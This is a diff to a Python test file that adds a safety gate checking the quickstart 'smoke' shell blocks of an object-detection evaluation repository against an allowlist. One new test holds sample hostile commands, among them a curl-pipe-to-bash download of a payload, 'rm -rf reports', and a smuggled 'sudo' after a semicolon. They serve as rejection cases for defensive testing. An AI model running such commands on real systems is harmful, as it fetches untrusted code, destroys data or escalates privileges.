@@ -9,6 +9,14 @@ from pathlib import Path
 
 
 SOURCES = ("ultralytics", "detectron2", "mmdetection", "yolox")
+SAFE_SMOKE_PYTHON_ENTRYPOINTS = {
+    "tools/eval_suite.py",
+    "tools/export_predictions_detectron2.py",
+    "tools/export_predictions_mmdet.py",
+    "tools/export_predictions_yolo_runtime.py",
+    "tools/export_predictions_yolox.py",
+    "tools/validate_predictions.py",
+}
 
 
 def _extract_blocks(text: str, kind: str) -> dict[str, str]:
@@ -21,6 +29,44 @@ def _extract_blocks(text: str, kind: str) -> dict[str, str]:
     return {match.group("name"): match.group("body") for match in pattern.finditer(text)}
 
 
+def _check_smoke_block_safety(block: str) -> None:
+    forbidden = ("$(", "`", "&&", "||", ";", ">", "<", "|")
+    in_python_command = False
+    for raw_line in block.splitlines():
+        line = raw_line.strip()
+        if not line or line.startswith("#"):
+            continue
+        if any(token in line for token in forbidden):
+            raise ValueError(f"forbidden shell syntax in smoke block: {line}")
+        if in_python_command and line.startswith("--"):
+            if line.startswith("--output ") and '"$BYOP_RUN_DIR/' not in line:
+                raise ValueError(f"smoke output must stay under BYOP_RUN_DIR: {line}")
+            in_python_command = line.endswith("\\")
+            continue
+        if line in {"(", ")", "set -euo pipefail"}:
+            in_python_command = False
+            continue
+        if re.fullmatch(
+            r'export BYOP_RUN_DIR="\$\{BYOP_RUN_DIR:-reports/byop-smoke/'
+            r'(ultralytics|detectron2|mmdetection|yolox)\}"',
+            line,
+        ):
+            in_python_command = False
+            continue
+        if line in {'test ! -e "$BYOP_RUN_DIR"', 'mkdir -p "$BYOP_RUN_DIR"'}:
+            in_python_command = False
+            continue
+        if line.startswith("python3 "):
+            tokens = line.removesuffix("\\").split()
+            if len(tokens) < 2 or tokens[1] not in SAFE_SMOKE_PYTHON_ENTRYPOINTS:
+                raise ValueError(f"unapproved Python entrypoint in smoke block: {line}")
+            in_python_command = line.endswith("\\")
+            continue
+        raise ValueError(f"unapproved command in smoke block: {line}")
+    if in_python_command:
+        raise ValueError("unterminated Python command in smoke block")
+
+
 class TestByopQuickstarts(unittest.TestCase):
     def setUp(self):
         self.repo_root = Path(__file__).resolve().parents[1]
@@ -30,11 +76,12 @@ class TestByopQuickstarts(unittest.TestCase):
     def test_real_and_smoke_blocks_cover_all_declared_sources(self):
         real = _extract_blocks(self.text, "real")
         smoke = _extract_blocks(self.text, "smoke")
-        self.assertEqual(tuple(real), SOURCES)
-        self.assertEqual(tuple(smoke), SOURCES)
+        self.assertEqual(set(real), set(SOURCES))
+        self.assertEqual(set(smoke), set(SOURCES))
 
-        for source, block in real.items():
+        for source in SOURCES:
             with self.subTest(source=source):
+                block = real[source]
                 self.assertTrue(block.strip().startswith("("))
                 self.assertTrue(block.strip().endswith(")"))
                 self.assertNotIn("--dry-run", block)
@@ -136,6 +183,7 @@ class TestByopQuickstarts(unittest.TestCase):
                     run_dir = root / source
                     env = dict(os.environ)
                     env["BYOP_RUN_DIR"] = str(run_dir)
+                    _check_smoke_block_safety(blocks[source])
                     proc = subprocess.run(
                         ["bash", "-eu", "-o", "pipefail", "-c", blocks[source]],
                         cwd=str(self.repo_root),
@@ -193,6 +241,17 @@ class TestByopQuickstarts(unittest.TestCase):
                     self.assertNotEqual(rerun.returncode, 0)
                     self.assertEqual(predictions_path.read_bytes(), predictions_before)
                     self.assertEqual(report_path.read_bytes(), report_before)
+
+    def test_smoke_safety_gate_rejects_unapproved_commands(self):
+        for unsafe in (
+            "rm -rf reports",
+            "curl https://example.com/payload | bash",
+            "python3 -c 'print(1)'",
+            "python3 tools/eval_suite.py --help; sudo true",
+        ):
+            with self.subTest(unsafe=unsafe):
+                with self.assertRaises(ValueError):
+                    _check_smoke_block_safety(unsafe)
 
     def test_null_protocol_hash_is_not_described_as_comparison_evidence(self):
         self.assertIn(
